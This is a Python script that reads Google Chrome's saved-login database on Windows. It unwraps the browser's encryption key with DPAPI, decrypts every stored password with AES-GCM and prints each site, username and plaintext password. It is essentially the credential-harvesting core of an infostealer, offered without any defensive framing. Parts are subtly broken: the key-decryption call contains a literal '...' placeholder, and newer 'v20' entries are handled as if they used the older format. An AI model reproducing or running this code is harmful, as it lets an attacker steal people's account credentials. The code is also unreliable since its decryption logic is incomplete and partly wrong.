import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES


CHROME_PATH = os.path.expandvars(
    r"%LOCALAPPDATA%\Google\Chrome\User Data"
)

LOGIN_DB = os.path.join(
    CHROME_PATH,
    "Default",
    "Login Data"
)

LOCAL_STATE = os.path.join(
    CHROME_PATH,
    "Local State"
)


def get_master_key():
    with open(LOCAL_STATE, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(
        local_state["os_crypt"]["encrypted_key"]
    )

    # Remove DPAPI prefix
    encrypted_key = encrypted_key[5:]

    master_key = win32crypt.CryptUnprotectData(...)[1]

    return master_key


def decrypt_password(buff, master_key):

    try:
        # Chrome AES-GCM format:
        # v10/v11 + nonce + ciphertext + tag

        if buff[:3] in (b"v10", b"v11", b"v20"):

            nonce = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]

            cipher = AES.new(
                master_key,
                AES.MODE_GCM,
                nonce=nonce
            )

            return cipher.decrypt_and_verify(
                ciphertext,
                tag
            ).decode("utf-8")

        else:
            # Older Chrome versions
            return win32crypt.CryptUnprotectData(
                buff,
                None,
                None,
                None,
                0
            )[1].decode()

    except Exception as e:
        return "DECRYPT ERROR: " + str(e)


def read_passwords():

    # Copy database because Chrome locks it
    temp_db = "LoginData_temp"

    shutil.copy2(
        LOGIN_DB,
        temp_db
    )

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT
            origin_url,
            username_value,
            password_value
        FROM logins
    """)

    master_key = get_master_key()

    for url, username, encrypted_password in cursor.fetchall():
        print(encrypted_password[:3])
        password = decrypt_password(
            encrypted_password,
            master_key
        )

        print("=" * 60)
        print("URL:", url)
        print("USER:", username)
        print("PASS:", password)

    cursor.close()
    conn.close()

    os.remove(temp_db)


if __name__ == "__main__":
    read_passwords()
